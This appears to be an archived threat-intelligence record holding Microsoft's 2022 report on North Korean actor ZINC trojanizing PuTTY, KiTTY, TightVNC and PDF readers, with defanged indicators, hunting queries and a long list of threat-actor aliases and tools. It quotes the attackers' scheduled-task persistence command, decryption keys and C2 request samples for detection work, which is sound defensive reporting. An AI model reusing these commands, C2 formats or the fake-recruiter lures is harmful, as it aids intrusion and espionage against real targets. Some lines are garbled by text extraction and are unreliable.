{
    "id": "6812a677-3c8b-45cd-b0d0-0a408e104dbf",
    "created_at": "2023-01-12T15:07:58.866897Z",
    "updated_at": "2025-03-27T02:17:23.200332Z",
    "deleted_at": null,
    "sha1_hash": "b41a76a549eb9ae91c614d1923ece06836cb2d49",
    "title": "2022-09-29 - ZINC weaponizing open-source software",
    "authors": "",
    "file_creation_date": "2022-10-02T12:25:44Z",
    "file_modification_date": "2022-10-02T12:25:44Z",
    "file_size": 793808,
    "plain_text": "# ZINC weaponizing open-source software\n\n**microsoft.com/security/blog/2022/09/29/zinc-weaponizing-open-source-software/**\n\nSeptember 29, 2022\n\nIn recent months, Microsoft has detected a wide range of social engineering campaigns using weaponized legitimate open-source software by\nan actor we track as [ZINC. Microsoft Threat Intelligence Center (MSTIC) observed activity targeting employees in organizations across](https://www.microsoft.com/security/blog/2021/01/28/zinc-attacks-against-security-researchers/)\nmultiple industries including media, defense and aerospace, and IT services in the US, UK, India, and Russia. Based on the observed\ntradecraft, infrastructure, tooling, and account affiliations, MSTIC attributes this campaign with high confidence to ZINC, a state-sponsored\ngroup based out of North Korea with objectives focused on espionage, data theft, financial gain, and network destruction.\n\nBeginning in June 2022, ZINC employed traditional social engineering tactics by initially connecting with individuals on LinkedIn to establish a\nlevel of trust with their targets. Upon successful connection, ZINC encouraged continued communication over WhatsApp, which acted as the\nmeans of delivery for their malicious payloads.\n\nMSTIC observed ZINC weaponizing a wide range of open-source software including PuTTY, KiTTY, TightVNC, Sumatra PDF Reader, and\nmuPDF/Subliminal Recording software installer for these attacks. ZINC was observed attempting to move laterally and exfiltrate collected\ninformation from victim networks. The actors have successfully compromised numerous organizations since June 2022. The ongoing\n[campaign related to the weaponized PuTTY was also reported by Mandiant earlier this month. Due to the wide use of the platforms and](https://www.mandiant.com/resources/blog/dprk-whatsapp-phishing)\nsoftware that ZINC utilizes in this campaign, ZINC could pose a significant threat to individuals and organizations across multiple sectors and\nregions.\n\nMicrosoft Defender for Endpoint provides comprehensive protection against tools and custom malware used by ZINC, including ZetaNile. The\nhunting queries provided at the end of this blog will help customers comprehensively search their environments for relevant indicators. As with\nany observed nation-state actor activity, Microsoft directly notifies customers that have been targeted or compromised, providing them with the\ninformation they need to secure their accounts.\n\n## Who is ZINC?\n\nZINC is a highly operational, destructive, and sophisticated nation-state activity group. Active since 2009, the activity group gained further\npublic notoriety in 2014 following their successful attack against Sony Pictures Entertainment. ZINC is known to use a variety of custom remote\naccess tools (RATs) as part of their arsenal, including those detected by Microsoft as FoggyBrass and PhantomStar.\n\nMicrosoft researchers have observed spear-phishing as a primary tactic of ZINC actors, but they have also been observed using strategic\nwebsite compromises and social engineering across social media to achieve their objectives. ZINC targets employees of companies it’s\nattempting to infiltrate and seeks to coerce these individuals into installing seemingly benign programs or opening weaponized documents that\n[contain malicious macros. Targeted attacks have also been carried out against security researchers over Twitter and LinkedIn.](https://www.microsoft.com/security/blog/2021/01/28/zinc-attacks-against-security-researchers/)\n\nZINC attacks appear to be motivated by traditional cyberespionage, theft of personal and corporate data, financial gain, and corporate network\ndestruction. ZINC attacks bear many hallmarks of state-sponsored activities, such as heightened operational security, sophisticated malware\nthat evolves over time, and politically motivated targeting.\n\nZINC, tracked by other security companies as Labyrinth Chollima and Black Artemis, has been observed conducting this campaign from late\nApril to mid-September 2022.\n\n\n-----\n\nFigure 1. Attack flow diagram for recent ZINC campaign\n\n## Observed actor activity\n\n### Impersonation and establishing contact\n\nLinkedIn Threat Prevention and Defense detected ZINC creating fake profiles claiming to be recruiters working at technology, defense, and\nmedia entertainment companies, with the goal of moving targets away from LinkedIn and to the encrypted messaging app WhatsApp for the\ndelivery of malware. ZINC primarily targeted engineers and technical support professionals working at media and information technology\ncompanies located in the UK, India, and the US. Targets received outreach tailored to their profession or background and were encouraged to\napply for an open position at one of several legitimate companies. In accordance with their policies, for accounts identified in these attacks,\nLinkedIn quickly terminated any accounts associated with inauthentic or fraudulent behavior.\n\nFigure\n\n2. Fraudulent recruiter profile\n\n\n-----\n\n### u t p e et ods used o de e y o eta e\n\nMSTIC has observed at least five methods of trojanized open-source applications containing the malicious payload and shellcode that is\n[tracked as the ZetaNile malware family. The ZetaNile implants, also known as BLINDINGCAN, have been covered in CISA and](https://www.cisa.gov/uscert/ncas/analysis-reports/ar20-232a) [JPCERT](https://blogs.jpcert.or.jp/en/2020/09/BLINDINGCAN.html)\nreports. The implant DLLs in the ZetaNile malware family are either packed with commercial software protectors such as Themida and\nVMProtect or are encrypted using custom algorithms. The payload in the malicious DLL is decrypted using a custom key, passed as part of the\nDLL search order hijacking of the legitimate Windows process, as shown in Figure 3. The ZetaNile implants use unique custom encryption\nmethods or AES encryption to generate command and control (C2) HTTP requests to known compromised C2 domains. By encoding the\nvictim information in the parameters for common keywords like gametype or bbs in the HTTP POSTs, these C2 communications can blend in\nwith legitimate traffic.\n\n### Weaponization of SSH clients\n\nOnce they have established a connection with their target, ZINC operationalized malicious versions of two SSH clients, PuTTY and KiTTY, that\nacted as the entry vector for the ZetaNile implant. Both utilities provide terminal emulator support for different networking protocols, making\nthem attractive programs for individuals commonly targeted by ZINC. The weaponized versions were often delivered as compressed ZIP\narchives or ISO files. Within that archive, the recipient is provided a ReadMe.txt and an executable file to run. As part of the evolution of ZINC’s\nmalware development, and in an effort to evade traditional defenses, running the included executable does not drop the ZetaNile implant. For\nZetaNile to be deployed, the SSH utility requires the IP provided in the ReadMe.txt file. An example of the content of that file is provided below:\n```\nServer: 137[.]184[.]15[.]189\n\nUser: [redacted]\n\nPass: [redacted]\n\n\n```\n**Weaponized PuTTY malware**\n\nZINC has been using trojanized PuTTY as part of its attack chain for many years, and this most recent variant establishes persistence on\ncompromised devices by utilizing scheduled tasks. This activity was recently reported by Mandiant. The malicious PUTTY.exe is configured to\ninstall the Event Horizon malware in C:\\ProgramData\\colorui.dll and subsequently copy C:\\Windows\\System32\\colorcpl.exe to\n_C:\\ProgramData\\colorcpl.exe. By using DLL search order hijacking, ZINC can load the second stage malware, colurui.dll, and decode the_\npayload with the key “0CE1241A44557AA438F27BC6D4ACA246” to be used for command and control. Upon successful connection to the C2\nserver, the attackers can install additional malware on the compromised device for other tasks.\n\nLastly, persistence is established with the creation of a daily scheduled task, PackageColor, as part of the configuration for the weaponized\nPuTTY. ZINC accomplishes this with the following command:\n\nFigure\n\n3. PuTTY – scheduled task as part of persistence\n\n**Weaponized KiTTY malware**\n\nWhile ZINC has utilized weaponized PuTTY for many years, ZINC has only recently expanded their capabilities to include weaponizing a fork\nof PuTTY called KiTTY. The executable first collects the username and hostname of the victim system and sends that information to a\nhardcoded IP 172[.]93[.]201[.]253 over TCP/22. Upon successful TCP connection to the server at 137[.]184[.]15[.]189, the malicious KiTTY\nexecutable then deploys the malware as %AppData%\\mscoree.dll following multiple rounds of decoding. The mscoree.dll file is the embedded\npayload, detected as EventHorizon, in the ZetaNile malware family. Similar to ZINC’s version of PuTTY, the actor uses DLL search order\nhijacking to load malicious DLL files that perform tasks within the context of these legitimate Windows processes, specifically through\n_%AppData%KiTTY%PresentationHost.exe -EmbeddingObject._\n\n\n-----\n\nFigure 4. KiTTY – DLL search order hijacking\nThe mscoree.dll malware is modularized in such a way that, upon successful connection to the compromised C2 domain, the attackers can\ninstall additional malware on the target system as needed using the existing C2 communication, such as executing\n_C:\\ProgramData\\Cisco\\fixmapi.exe -s AudioEndpointBuilder to load malicious mapistub.dll from the compromised C2 server. The HTTP POST_\nrequests contain the hardcoded user agent string with misspelled “Edge”, as detailed below, and contain a unique ID for the field gametype\nand the hardcoded value for the field type for malware campaign tracking purposes:\n```\n POST /wp-includes/php-compat/compat.php HTTP/1.1\n Accept: text/*\n User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63\n Safari/537.36 Edg/100.0.1185.39\n Content-Type: application/x-www-form-urlencoded\n Content-Length: 39\n Host: olidhealth[.]com\n Connection: Keep-Alive\n Cache-Control: no-cache \n gametype=[UniqueId]&type=O8Akm8aV09Nw412KoWJds\n\n### Weaponized TightVNC Viewer\n\n```\nBeginning in September 2022, ZINC was observed utilizing a trojanized TightVNC Viewer that was delivered to a target alongside a\nweaponized SSH utility over WhatsApp. This malware has a unique PDBPath:\n```\nN:\\2.MyDevelopment\\3.Tools_Development\\4.TightVNCCustomize\\Munna_Customize\\tightvnc\\x64\\\\Release\\tvnviewer.pdb\n\n```\nThe weaponized versions of TightVNC Viewer often were delivered as compressed ZIP archives or job description-themed ISO files via online\nplatforms such as WhatsApp. Within that archive, the recipient is provided a ReadMe.txt and an executable file to run. The .txt file has the\nfollowing content:\n```\nPlatform: 2nd from the list\n\nUser: [redacted]\n\nPass: [redacted]\n\n```\nAs part of the threat actor’s latest malware technique to evade traditional defenses, the malicious TightVNC Viewer has a pre-populated list of\nremote hosts, and it’s configured to install the backdoor only when the user selects ec2-aet-tech.w-ada[.]amazonaws from the drop-down\nmenu in the TightVNC Viewer, as shown in Figure 5:\n\nFigure 5. Weaponized TightVNC Viewer – user interface\n\n\n-----\n\ne a a e as co gu ed to se d t e use a e a d ost a e to [ ] 38[ ] [ ]8 o C / as pa t o t e ct c ec t t e C\nand establish VNC connections to the same IP on port TCP/5900. Once a successful connection is established to the server IP, the embedded\nsecond stage DLL payload from TightVNC.exe is loaded in memory to establish C2 communication to a known compromised domain.\n\n### Weaponization of Sumatra PDF reader and muPDF/Subliminal Recording installer\n\nZINC has operationalized malicious versions of two PDF readers, Sumatra PDF and muPDF/Subliminal Recording installer, that act as the\nentry vector for the ZetaNile implant. This delivery mechanism is often utilized in relation to fraudulent job postings delivered to job-seeking\ntargets in the IT and defense sector. The weaponized versions were often delivered as compressed ZIP archives. Within that archive, the\nrecipient is provided with an executable file to run. While the malicious Sumatra PDF reader is a fully functional PDF reader that can load the\nmalicious implant from a fake PDF, the muPDF/Subliminal Recording installer can set up the backdoor without loading any malicious PDF files.\n\n**Trojanized Sumatra PDF Reader**\n\nThe trojanized version of Sumatra PDF Reader named SecurePDF.exe has been utilized by ZINC since at least 2019 and remains a unique\nZINC tradecraft. SecurePDF.exe is a modularized loader that can install the ZetaNile implant by loading a weaponized job application themed\nfile with a .PDF extension. The fake PDF contains a header “SPV005”, a decryption key, encrypted second stage implant payload, and\nencrypted decoy PDF, which is rendered in the Sumatra PDF Reader when the file is opened.\n\nOnce loaded in memory, the second stage malware is configured to send the victim’s system hostname and device information using custom\nencoding algorithms to a C2 communication server as part of the C2 check-in process. The attackers can install additional malware onto the\ncompromised devices using the C2 communication as needed.\n\nFigure\n\n6. SecurePDF interface\n\n**Trojanized muPDF/Subliminal Recording installer**\n\nWithin the trojanized version of muPDF/Subliminal Recording installer, setup.exe is configured to check if the file path\n_ISSetupPrerequisites\\Setup64.exe exists and write C:\\colrctl\\colorui.dll on disk after extracting the embedded executable inside setup.exe. It_\nthen copies C:\\Windows\\System32\\ColorCpl.exe to C:\\ColorCtrl\\ColorCpl.exe. For the second stage malware, the malicious installer creates a\nnew process C:\\colorctrl\\colorcpl.exe C3A9B30B6A313F289297C9A36730DB6D, and the argument\n_C3A9B30B6A313F289297C9A36730DB6D gets passed on to colorui.dll as a decryption key. The DLL colorui.dll, which Microsoft is tracking_\nas the EventHorizon malware family, is injected into C:\\Windows\\System\\credwiz.exe or iexpress.exe to send C2 HTTP requests as part of the\nvictim check-in process and to get an additional payload.\n\n\n-----\n\n```\n POST /support/support.asp HTTP/1.1\n Cache-Control: no-cache\n Connection: close\n Content-Type: application/x-www-form-urlencoded\n Accept: */*\n User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64;\n Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729;\n InfoPath.3; .NET4.0C; .NET4.0E)\n Content-Length: 125\n Host: www.elite4print[.]com \n bbs=[encrypted payload]= &article=[encrypted payload]\n\n```\nMicrosoft will continue to monitor ZINC activity and implement protections for our customers. The current detections and IOCs in place across\nour security products are detailed below.\n\n## Recommended customer actions\n\nThe techniques used by the actor and described in the “Observed actor activity” section can be mitigated by adopting the security\nconsiderations provided below:\n\nUse the included indicators of compromise to investigate whether they exist in your environment and assess for potential intrusion.\nBlock in-bound traffic from IPs specified in the “Indicators of compromise” table.\nReview all authentication activity for remote access infrastructure, with a particular focus on accounts configured with single factor\nauthentication, to confirm authenticity and investigate any anomalous activity.\nEnable multifactor authentication (MFA) to mitigate potentially compromised credentials and ensure that MFA is enforced for all remote\n[connectivity. NOTE: Microsoft strongly encourages all customers download and use password-less solutions like Microsoft Authenticator](https://www.microsoft.com/account/authenticator/)\nto secure your accounts.\n[Educate end users about preventing malware infections, including by ignoring or deleting unsolicited and unexpected emails with ISO](https://docs.microsoft.com/windows/security/threat-protection/intelligence/prevent-malware-infection)\nattachments. Encourage end users to practice good credential hygiene—limit the use of accounts with local or domain admin privileges\nand turn on [Microsoft Defender Firewall to prevent malware infection and stifle propagation.](https://support.microsoft.com/windows/turn-microsoft-defender-firewall-on-or-off-ec0844f7-aebd-0583-67fe-601ecf5d774f)\n[Educate end users about protecting personal and business information in social media, filtering unsolicited communication, identifying](https://docs.microsoft.com/windows/security/threat-protection/intelligence/prevent-malware-infection)\nlures in spear-phishing email and watering holes, and reporting of reconnaissance attempts and other suspicious activity.\n\n## Indicators of compromise (IOCs)\n\nThe below list provides IOCs observed during our investigation. We encourage our customers to investigate these indicators in their\nenvironments and implement detections and protections to identify past related activity and prevent future attacks against their systems.\n\n**Indicator** **Type** **Des**\n\nAmazon-KiTTY.exe File name\n\nAmazon_IT_Assessment.iso File name\n\nIT_Assessment.iso File name\n\namazon_assessment_test.iso File name\n\nSecurePDF.exe File name\n\nC:\\ProgramData\\Comms\\colorui.dll File path Mal\nimp\n\n%APPDATA%\\KiTTY\\mscoree.dll File path Mal\nimp\n\n172.93.201[.]253 IP address Adv\nserv\n\n137.184.15[.]189 IP address Adv\nserv\n\n44.238.74[.]84 IP address Har\nServ\nmal\nTigh\n\n\nc:\\windows\\system32\\schtasks.exe /CREATE /SC DAILY /MO 1 /ST 10:30 /TR “C:\\Windows\\System32\\cmd.exe /c start /b\nC:\\ProgramData\\PackageColor\\colorcpl.exe 0CE1241A44557AA438F27BC6D4ACA246” /TN PackageColor /F\n\n\nScheduled\ntask name\n\n\nPutt\nSch\n\n\n-----\n\n**Indicator** **Type** **Des**\n\n1492fa04475b89484b5b0a02e6ba3e52544c264c294b57210404b96b65e63266 SHA-256 Mal\nPutt\n\naaad412aeb0f98c2c27bb817682f08673902a48b65213091534f96fe6f5494d9 SHA-256 Mal\ncolo\n\n63cddab76e9d63e3cbea421b607342735d924e462c40f3917b1b5fbdf8d4a20d SHA-256 Mal\nAma\n\ne1ecf0f7bd90553baaa83dcdc177e1d2b20d6ee5520f5d9b44cdf59389432b10 SHA-256 Mal\nimp\nmsc\n\nc5a470cdf6f57125a8671f6b8843149cc78ccbc1a7bc615f34b23d9f241312bf SHA-256 Wea\nSum\nPDF\n\n71beb4252e93291c7b14dfcb4cbb5d58144a76181fbe4aab3592121a3dbd9c55 SHA-256 Wea\nmuP\nRec\n\nolidhealth[.]com/wp-includes/php-compat/compat.php Compromised\ndomain\n\nhurricanepub[.]com/include/include.php Compromised\ndomain\n\nturnscor[.]com/wp-includes/contacts.php Compromised\ndomain\n\nelite4print[.]com/support/support.asp Compromised\ndomain\n\ncats.runtimerec[.]com/db/dbconn.php Compromised\ndomain\n\nrecruitment.raystechserv[.]com/lib/artichow/BarPlotDashboard.object.php Compromised\ndomain\n\n\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63\nSafari/537.36 Edg/100.0.1185.39\n\nMozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR\n3.5.30729; .NET CLR 3.0.30729; InfoPath.3; .NET4.0C; .NET4.0E)\n\n\nUser agent Har\nKitty\n\nUser agent Har\nSec\nUA\n\n\nN:\\2.MyDevelopment\\3.Tools_Development\\4.TightVNCCustomize\\Munna_Customize\\tightvnc\\x64\\\\Release\\tvnviewer.pdb PDBPath PDB\nmal\nTigh\n\n37e30dc2faaabaf93f0539ffbde032461ab63a2c242fbe6e1f60a22344c8a334 SHA-256 Mal\nTigh\n\n14f736b7df6a35c29eaed82a47fc0a248684960aa8f2222b5ab8cdad28ead745 SHA-256 Mal\nTigh\n\n**NOTE: These indicators should not be considered exhaustive for this observed activity.**\n\n## Detections\n\n### Microsoft Defender Antivirus\n\n[Microsoft Defender Antivirus and Microsoft Defender for Endpoint customers should look for the following family names for activity related to](https://learn.microsoft.com/microsoft-365/security/defender-endpoint/microsoft-defender-antivirus-windows)\nthese attacks:\n\nZetaNile\nEventHorizon\nFoggyBrass\nPhantomStar\n\n### Microsoft Defender for Endpoint\n\n\n-----\n\ne o o g c oso t [e e de](https://www.microsoft.com/security/business/endpoint-security/microsoft-defender-endpoint) o dpo t a e ts cou d d cate act ty assoc ated t t s t eat ese a e ts, o e e, ca be t gge ed\nby unrelated threat activity.\n\nSuspicious Task Scheduler activity\nSuspicious connection to remote service\nA suspicious file was observed\nAn executable loaded an unexpected dll\nPossible theft of remote session credentials\nSuspicious connection to remote service\n\n## Advanced hunting queries\n\n### Microsoft Sentinel\n\nMicrosoft Sentinel customers can use the following queries to look for the related malicious indicators in their environments.\n\n**Identify ZINC IP/domain/hash IOC**\n\nThis query identifies a match across various data feeds for IP/Domain IOCs related to the Zinc actor as shared in this blog post.\n\nhttps://github.com/Azure/Azure-Sentinel/blob/master/Solutions/Zinc Open Source/Analytic\nRules/ZincOctober2022_IP_Domain_Hash_IOC.yaml\n\n**Identify ZINC filename/command line IOC**\n\nTo locate possible Zinc Filename/command line activity shared in the blog Microsoft Sentinel customers can use the queries below:\n\nhttps://github.com/Azure/Azure-Sentinel/blob/master/Solutions/Zinc Open Source/Analytic\nRules/ZincOctober2022_Filename_Commandline_IOC.yaml\n\n**Identify ZINC AV hits IOC**\n\nThis query looks for Microsoft Defender AV detections related to Zinc actor as shared in the blog post:\n\n[https://github.com/Azure/Azure-Sentinel/blob/master/Solutions/Zinc Open Source/Analytic Rules/ZincOctober2022_AVHits_IOC.yaml](https://github.com/Azure/Azure-Sentinel/blob/master/Solutions/Zinc%20Open%20Source/Analytic%20Rules/ZincOctober2022_AVHits_IOC.yaml)\n\n### Microsoft 365 Defender\n\nTo locate related activity, Microsoft 365 Defender customers can run the following advanced hunting queries:\n\n**Suspicious mapistub.dll file creation**\n\nLook for PresentationHost.exe creating mapistub.dll, likely for use in DLL search order hijacking attacks.\n```\nDeviceFileEvents\n\n| where InitiatingProcessFileName =~ \"presentationhost.exe\"\n\n| where FileName =~ \"mapistub.dll\"\n\n```\n**Suspicious mscoree.dll file creation**\n\nLook instances of mscoree.dll created by PuTTY processes.\n```\nDeviceFileEvents\n\n| where InitiatingProcessFileName hassuffix \"kitty.exe\" or InitiatingProcessVersionInfoInternalFileName has \"PuTTY\"\n\n| where FileName =~ \"mscoree.dll\"\n\n```\n**Suspicious colorcpl.exe image load**\n\nSurface instances of the colorcpl.exe process loading colorui.dll not in an expected path, indicative of a DLL search order hijacking attack.\n```\nDeviceImageLoadEvents\n\n| where InitiatingProcessFileName =~ \"colorcpl.exe\"\n\n| where FileName =~ \"colorui.dll\" and not(FolderPath has_any(\"system32\", \"syswow64\", \"program files\"))\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-09-29 - ZINC weaponizing open-source software.pdf"
    ],
    "report_names": [
        "2022-09-29 - ZINC weaponizing open-source software.pdf"
    ],
    "threat_actors": [
        {
            "id": "998746e1-b4b8-429b-a737-6eb368247c42",
            "created_at": "2022-10-25T16:07:23.505704Z",
            "updated_at": "2025-03-27T02:02:09.836193Z",
            "deleted_at": null,
            "main_name": "Covellite",
            "aliases": [
                "Black Artemis",
                "CTG-2460",
                "Nickel Academy"
            ],
            "source_name": "ETDA:Covellite",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "32a223a8-3c79-4146-87c5-8557d38662ae",
            "created_at": "2022-10-25T15:50:23.703698Z",
            "updated_at": "2025-03-27T02:00:55.528031Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Lazarus Group",
                "Labyrinth Chollima",
                "HIDDEN COBRA",
                "Guardians of Peace",
                "NICKEL ACADEMY",
                "Diamond Sleet"
            ],
            "source_name": "MITRE:Lazarus Group",
            "tools": [
                "RawDisk",
                "Proxysvc",
                "BADCALL",
                "FALLCHILL",
                "WannaCry",
                "HOPLIGHT",
                "TYPEFRAME",
                "Dtrack",
                "HotCroissant",
                "HARDRAIN",
                "Dacls",
                "KEYMARBLE",
                "TAINTEDSCRIBE",
                "AuditCred",
                "netsh",
                "ECCENTRICBANDWAGON",
                "AppleJeus",
                "BLINDINGCAN",
                "ThreatNeedle",
                "Volgmer",
                "Cryptoistic",
                "RATANKBA",
                "Bankshot",
                "Torisma",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "9e767b38-12ae-4ef7-9878-5ce1701066d7",
            "created_at": "2024-05-01T02:03:08.131819Z",
            "updated_at": "2025-03-27T02:05:17.413497Z",
            "deleted_at": null,
            "main_name": "NICKEL ACADEMY",
            "aliases": [
                "COVELLITE ",
                "CTG-2460 ",
                "Diamond Sleet ",
                "Guardians of Peace",
                "HIDDEN COBRA ",
                "High Anonymous",
                "Labyrinth Chollima ",
                "NNPT Group",
                "New Romanic Cyber Army Team",
                "Temp.Hermit ",
                "The Lazarus Group ",
                "UNC577 ",
                "Who Am I?",
                "Whois Team",
                "ZINC ",
                "Black Artemis "
            ],
            "source_name": "Secureworks:NICKEL ACADEMY",
            "tools": [
                " DarkMessenger",
                " Destover",
                " Duuzer",
                " HOPLIGHT",
                " Joanap",
                " KorHigh",
                " LiveJinx",
                " Volgmer",
                "Brambul"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f32df445-9fb4-4234-99e0-3561f6498e4e",
            "created_at": "2022-10-25T16:07:23.756373Z",
            "updated_at": "2025-03-27T02:02:09.966155Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "APT-C-26",
                "ATK 3",
                "Appleworm",
                "Citrine Sleet",
                "DEV-0139",
                "Diamond Sleet",
                "Gleaming Pisces",
                "Gods Apostles",
                "Gods Disciples",
                "Group 77",
                "Guardians of Peace",
                "Hastati Group",
                "Hidden Cobra",
                "ITG03",
                "Jade Sleet",
                "Labyrinth Chollima",
                "Lazarus Group",
                "NewRomanic Cyber Army Team",
                "Operation 99",
                "Operation AppleJeus",
                "Operation AppleJeus sequel",
                "Operation Blockbuster: Breach of Sony Pictures Entertainment",
                "Operation CryptoCore",
                "Operation Dream Job",
                "Operation Dream Magic",
                "Operation Flame",
                "Operation GhostSecret",
                "Operation In(ter)caption",
                "Operation LolZarus",
                "Operation Marstech Mayhem",
                "Operation No Pineapple!",
                "Operation North Star",
                "Operation Phantom Circuit",
                "Operation Sharpshooter",
                "Operation Ten Days of Rain / DarkSeoul",
                "Operation Troy",
                "SectorA01",
                "Slow Pisces",
                "TA404",
                "TraderTraitor",
                "UNC2970",
                "UNC4034",
                "UNC4736",
                "UNC4899",
                "UNC577",
                "Whois Hacking Team"
            ],
            "source_name": "ETDA:Lazarus Group",
            "tools": [
                "3CX Backdoor",
                "3Rat Client",
                "3proxy",
                "AIRDRY",
                "ARTFULPIE",
                "ATMDtrack",
                "AlphaNC",
                "Alreay",
                "Andaratm",
                "AngryRebel",
                "AppleJeus",
                "Aryan",
                "AuditCred",
                "BADCALL",
                "BISTROMATH",
                "BLINDINGCAN",
                "BTC Changer",
                "BUFFETLINE",
                "BanSwift",
                "Bankshot",
                "Bitrep",
                "Bitsran",
                "BlindToad",
                "Bookcode",
                "BootWreck",
                "BottomLoader",
                "Brambul",
                "BravoNC",
                "Breut",
                "COLDCAT",
                "COPPERHEDGE",
                "CROWDEDFLOUNDER",
                "Castov",
                "CheeseTray",
                "CleanToad",
                "ClientTraficForwarder",
                "CollectionRAT",
                "Concealment Troy",
                "Contopee",
                "CookieTime",
                "Cyruslish",
                "DAVESHELL",
                "DBLL Dropper",
                "DLRAT",
                "DRATzarus",
                "DRATzarus RAT",
                "Dacls",
                "Dacls RAT",
                "DarkComet",
                "DarkKomet",
                "DeltaCharlie",
                "DeltaNC",
                "Dembr",
                "Destover",
                "DoublePulsar",
                "Dozer",
                "Dtrack",
                "Duuzer",
                "DyePack",
                "ECCENTRICBANDWAGON",
                "ELECTRICFISH",
                "Escad",
                "EternalBlue",
                "FALLCHILL",
                "FYNLOS",
                "FallChill RAT",
                "Farfli",
                "Fimlis",
                "FoggyBrass",
                "FudModule",
                "Fynloski",
                "Gh0st RAT",
                "Ghost RAT",
                "Gopuram",
                "HARDRAIN",
                "HIDDEN COBRA RAT/Worm",
                "HLOADER",
                "HOOKSHOT",
                "HOPLIGHT",
                "HOTCROISSANT",
                "HOTWAX",
                "HTTP Troy",
                "Hawup",
                "Hawup RAT",
                "Hermes",
                "HotCroissant",
                "HotelAlfa",
                "Hotwax",
                "HtDnDownLoader",
                "Http Dr0pper",
                "ICONICSTEALER",
                "Joanap",
                "Jokra",
                "KANDYKORN",
                "KEYMARBLE",
                "Kaos",
                "KillDisk",
                "KillMBR",
                "Koredos",
                "Krademok",
                "LIGHTSHIFT",
                "LIGHTSHOW",
                "LOLBAS",
                "LOLBins",
                "Lazarus",
                "LightlessCan",
                "Living off the Land",
                "MATA",
                "MBRkiller",
                "MagicRAT",
                "Manuscrypt",
                "Mimail",
                "Mimikatz",
                "Moudour",
                "Mydoom",
                "Mydoor",
                "Mytob",
                "NACHOCHEESE",
                "NachoCheese",
                "NestEgg",
                "NickelLoader",
                "NineRAT",
                "Novarg",
                "NukeSped",
                "OpBlockBuster",
                "PCRat",
                "PEBBLEDASH",
                "PLANKWALK",
                "POOLRAT",
                "PSLogger",
                "PhanDoor",
                "Plink",
                "PondRAT",
                "PowerBrace",
                "PowerRatankba",
                "PowerShell RAT",
                "PowerSpritz",
                "PowerTask",
                "Preft",
                "ProcDump",
                "Proxysvc",
                "PuTTY Link",
                "QUICKRIDE",
                "QUICKRIDE.POWER",
                "Quickcafe",
                "QuiteRAT",
                "R-C1",
                "ROptimizer",
                "Ratabanka",
                "RatabankaPOS",
                "Ratankba",
                "RatankbaPOS",
                "RawDisk",
                "RedShawl",
                "Rifdoor",
                "Rising Sun",
                "Romeo-CoreOne",
                "RomeoAlfa",
                "RomeoBravo",
                "RomeoCharlie",
                "RomeoCore",
                "RomeoDelta",
                "RomeoEcho",
                "RomeoFoxtrot",
                "RomeoGolf",
                "RomeoHotel",
                "RomeoMike",
                "RomeoNovember",
                "RomeoWhiskey",
                "Romeos",
                "RustBucket",
                "SHADYCAT",
                "SHARPKNOT",
                "SIGFLIP",
                "SIMPLESEA",
                "SLICKSHOES",
                "SORRYBRUTE",
                "SUDDENICON",
                "SUGARLOADER",
                "SheepRAT",
                "SierraAlfa",
                "SierraBravo",
                "SierraCharlie",
                "SierraJuliett-MikeOne",
                "SierraJuliett-MikeTwo",
                "SimpleTea",
                "SimplexTea",
                "SmallTiger",
                "Stunnel",
                "TAINTEDSCRIBE",
                "TAXHAUL",
                "TFlower",
                "TOUCHKEY",
                "TOUCHMOVE",
                "TOUCHSHIFT",
                "TOUCHSHOT",
                "TWOPENCE",
                "TYPEFRAME",
                "Tdrop",
                "Tdrop2",
                "ThreatNeedle",
                "Tiger RAT",
                "TigerRAT",
                "Trojan Manuscript",
                "Troy",
                "TroyRAT",
                "VEILEDSIGNAL",
                "VHD",
                "VHD Ransomware",
                "VIVACIOUSGIFT",
                "VSingle",
                "ValeforBeta",
                "Volgmer",
                "Vyveva",
                "W1_RAT",
                "Wana Decrypt0r",
                "WanaCry",
                "WanaCrypt",
                "WanaCrypt0r",
                "WannaCry",
                "WannaCrypt",
                "WannaCryptor",
                "WbBot",
                "Wcry",
